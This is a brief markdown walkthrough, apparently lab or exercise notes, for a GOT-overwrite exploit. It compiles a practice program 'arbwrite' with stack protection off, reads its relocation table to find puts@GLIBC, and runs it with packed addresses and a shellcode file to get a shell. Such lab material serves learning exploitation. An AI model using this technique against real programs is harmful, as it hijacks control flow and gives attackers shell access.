## Compile arbwrite.c

```
gcc -fno-stack-protector -z execstack -o arbwrite arbwrite.c
```

# View Dynamic Relocation Entries (GOT Table)
```
objdump -R ./arbwrite
```

## Exploiting GOT table 
Select the memory address for the puts@GLIBC

```
08049680 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

```
./arbwrite `perl -e 'print"\x80\x96\x04\x08"'` `perl -e 'print "\xfa\xf7\xff\xbf"'` `cat shellcode/shell`
```
